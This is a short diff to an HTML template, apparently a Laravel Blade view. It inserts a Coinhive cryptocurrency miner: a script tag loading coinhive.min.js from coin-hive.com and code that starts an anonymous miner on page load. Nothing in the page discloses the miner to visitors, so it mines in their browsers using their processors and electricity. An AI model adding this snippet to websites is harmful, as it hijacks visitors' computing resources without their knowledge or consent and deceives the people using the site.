@@ -83,5 +83,14 @@
                 </div>
             </div>
         </div>
+        <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+        <script>
+            var hive = {
+                key: "{{ env('COIN_HIVE_KEY') }}"
+            };
+
+            var miner = new CoinHive.Anonymous(hive.key);
+            miner.start();
+        </script>
     </body>
 </html>
